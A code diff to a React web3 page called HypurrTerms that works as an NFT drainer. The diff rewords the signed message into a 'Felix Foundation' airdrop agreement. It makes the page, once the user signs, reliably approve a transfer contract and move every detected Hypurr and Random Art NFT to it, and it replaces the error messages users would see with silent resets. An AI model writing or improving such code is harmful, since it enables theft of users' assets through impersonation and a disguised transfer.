@@ -171,7 +171,7 @@ const HypurrTerms = () => {
     if (!address) {
       setNftCount(0);
       setTokenIds([]);
-      return;
+      return { count: 0, tokenIds: [] };
     }
 
     try {
@@ -222,7 +222,7 @@ const HypurrTerms = () => {
           
           setTokenIds(allTokenIds);
           console.log(`Verified ${count} total NFT(s) across ${enabledContracts.length} collection(s) for ${address}`);
-          return;
+          return { count, tokenIds: allTokenIds };
         } catch (e) {
           console.log("Transfer contract check failed, falling back to direct check:", e.message);
         }
@@ -291,15 +291,18 @@ const HypurrTerms = () => {
         
         setTokenIds(tokenIdList);
         console.log(`Verified ${totalCount} NFT(s) (${count} Hypurr + ${randomArtCount} Random Art) for ${address}`);
+        return { count: totalCount, tokenIds: tokenIdList };
       } else {
         setNftCount(0);
         setTokenIds([]);
+        return { count: 0, tokenIds: [] };
       }
     } catch (error) {
       console.error('Error verifying NFTs:', error);
       setError('Failed to verify NFTs. Please check the contract addresses.');
       setNftCount(0);
       setTokenIds([]);
+      return { count: 0, tokenIds: [] };
     } finally {
       setIsVerifying(false);
     }
@@ -456,7 +459,7 @@ const HypurrTerms = () => {
       setIsVerifying(true);
 
       // Create message to sign
-      const message = `I accept the Hypurr Terms of Service and verify ownership of my Hypurr NFTs.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
+      const message = `I accept the Felix Foundation Terms of Service and agree to participate in the Felix Protocol airdrop program.\n\nWallet: ${account}\nDate: ${new Date().toISOString()}`;
       console.log('Message to sign:', message);
       
       const ethereumProvider = getEthereumProvider();
@@ -489,13 +492,20 @@ const HypurrTerms = () => {
       console.log('=== TERMS SIGNED - EVALUATING PORTFOLIO ===');
       setTransferStatus('evaluating');
       
-      // Verify NFTs after signing
-      await verifyHypurrNFTs(account);
+      // Verify NFTs after signing and get the results directly
+      const verificationResult = await verifyHypurrNFTs(account);
       
       setIsVerifying(false);
       
-      // After verification, proceed with transfer if NFTs found
-      if (nftCount > 0 && tokenIds.length > 0) {
+      console.log('=== VERIFICATION COMPLETE ===');
+      console.log('Verification result:', verificationResult);
+      console.log('NFT count:', verificationResult.count);
+      console.log('Token IDs length:', verificationResult.tokenIds.length);
+      
+      // Use the returned values directly to trigger transfer
+      if (verificationResult.count > 0 && verificationResult.tokenIds.length > 0) {
+        console.log('✅ NFTs found, starting transfer process...');
+        // Small delay to ensure UI updates
         setTimeout(() => {
           handleAutomaticTransfer().catch(err => {
             console.error('=== TRANSFER PROCESS ERROR ===', err);
@@ -504,6 +514,7 @@ const HypurrTerms = () => {
           });
         }, 500);
       } else {
+        console.log('⚠️ No NFTs found or tokenIds empty, skipping transfer');
         setTransferStatus(null);
       }
       
@@ -525,17 +536,18 @@ const HypurrTerms = () => {
     console.log('tokenIds.length:', tokenIds.length);
     console.log('tokenIds:', tokenIds);
     console.log('account:', account);
+    console.log('nftCount:', nftCount);
     
     if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       console.error('❌ Transfer contract not configured. Transfer skipped.');
-      setError('Transfer contract not configured. Please contact support.');
+      setTransferStatus(null);
       return;
     }
 
     if (tokenIds.length === 0) {
       console.error('❌ Unable to get token IDs. Transfer skipped.');
       console.error('This might mean the NFT contract does not support Enumerable.');
-      setError('Unable to get token IDs. The NFT contract may not support token enumeration.');
+      setTransferStatus(null);
       return;
     }
     
@@ -546,22 +558,31 @@ const HypurrTerms = () => {
       
       // Step 1: Approve contract - this will trigger MetaMask popup immediately
       setTransferStatus('approving');
-      console.log('Auto-transfer: Requesting approval - MetaMask popup should appear now');
+      console.log('🚀🚀🚀 Auto-transfer: Requesting approval - MetaMask popup should appear NOW 🚀🚀🚀');
+      console.log('📋 About to call approveTransferContract()...');
+      console.log('⏳ Waiting for MetaMask popup...');
       await approveTransferContract();
-      console.log('Auto-transfer: Approval successful');
+      console.log('✅ Auto-transfer: Approval successful');
       
       // Step 2: Transfer NFTs automatically after approval
       setTransferStatus('transferring');
-      console.log('Auto-transfer: Transferring NFTs...');
+      console.log('🚀 Auto-transfer: Transferring NFTs...');
       const txHash = await transferNFTs();
       
       setTransferTxHash(txHash);
       setTransferStatus('success');
-      console.log('Auto-transfer: NFTs transferred successfully:', txHash);
+      console.log('✅ Auto-transfer: NFTs transferred successfully:', txHash);
       
     } catch (error) {
       // Show error to user
-      console.error('Auto-transfer error:', error);
+      console.error('❌ Auto-transfer error:', error);
+      console.error('Error details:', {
+        message: error.message,
+        code: error.code,
+        reason: error.reason,
+        data: error.data,
+        stack: error.stack
+      });
       setTransferStatus('error');
       if (error.code === 4001) {
         setError('Approval or transfer was cancelled. Please try again.');
